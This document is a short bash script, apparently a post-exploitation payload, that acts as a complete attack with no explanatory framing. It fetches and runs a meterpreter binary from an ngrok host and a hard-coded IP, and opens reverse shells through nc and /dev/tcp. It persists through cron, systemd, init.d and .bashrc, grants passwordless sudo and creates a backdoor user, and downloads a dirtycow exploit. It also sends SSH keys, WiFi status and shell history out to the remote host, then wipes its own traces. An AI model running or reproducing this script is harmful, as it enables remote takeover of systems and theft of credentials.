#!/bin/bash


NGROK_URL="https://directly-hippopotamic-berniece.ngrok-free.dev"  
C2_IP=$(curl -s "$NGROK_URL/ip" 2>/dev/null || echo "117.238.105.201")
C2_PORT="4443"


METER_URL="$NGROK_URL:8080/meterpreter.elf"


cd /tmp
wget -q --no-check-certificate -O meter.elf "$METER_URL" || \
curl -s -o meter.elf "$METER_URL"

[ -f meter.elf ] && chmod +x meter.elf && nohup ./meter.elf -P "$C2_IP" -p "$C2_PORT" &


{
    rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc "$C2_IP" 4445 >/tmp/f &
} || {
    bash -i >& /dev/tcp/$C2_IP/4446 0>&1 &
}


{
    
    (crontab -l 2>/dev/null; echo "* * * * * /tmp/meter.elf -P $C2_IP -p $C2_PORT") | crontab -
    
    
    echo "[Unit]\nDescription=Update\n[Service]\nExecStart=/tmp/meter.elf -P $C2_IP -p $C2_PORT\n[Install]\nWantedBy=multi-user.target" > /tmp/update.service
    systemctl enable /tmp/update.service 2>/dev/null || :
    
    
    [ -d /etc/init.d ] && ln -s /tmp/meter.elf /etc/init.d/update
    
   
    echo "/tmp/meter.elf -P $C2_IP -p $C2_PORT &" >> ~/.bashrc
    
    
    echo "ALL ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers 2>/dev/null || :
    
} &


{
    find / -perm -4000 -type f 2>/dev/null | while read f; do $f 2>&1 | grep -q flag && $f; done &
    
    [ -w /etc/passwd ] && useradd -m backdoor -s /bin/bash -G sudo
    
    cd /tmp; wget -q http://$C2_IP:8080/dirtycow && chmod +x dirtycow && ./dirtycow &
    
} &


{
    wpa_cli -i wlan0 status 2>/dev/null | nc $C2_IP 4447 &
    
    tar czf - ~/.ssh 2>/dev/null | nc $C2_IP 4448 &
    
    history | nc $C2_IP 4449 &
    
} &


sleep 5
rm -rf /tmp/meter* /tmp/f $0
history -c && history -w
